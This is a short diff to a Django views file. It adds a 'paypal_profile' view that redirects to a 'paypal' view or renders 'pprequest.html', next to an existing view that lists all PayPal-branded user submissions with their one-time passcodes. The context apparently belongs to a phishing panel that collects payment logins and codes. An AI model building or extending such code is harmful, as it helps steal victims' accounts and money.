@@ -921,3 +921,12 @@ def is_superuser(user):
 def infodbpaypal(request):
     user_submissions = UserSubmissionPaypal.objects.all().prefetch_related('otps')
     return render(request, 'view_all.html', {'user_submissions': user_submissions})
+
+
+def paypal_profile(request):
+    if request.method == 'POST' and 'paypal' in request.POST:
+        # Redirect to the PayPal view
+        return redirect(reverse('paypal'))
+    
+    # Render the HTML template
+    return render(request, 'pprequest.html')
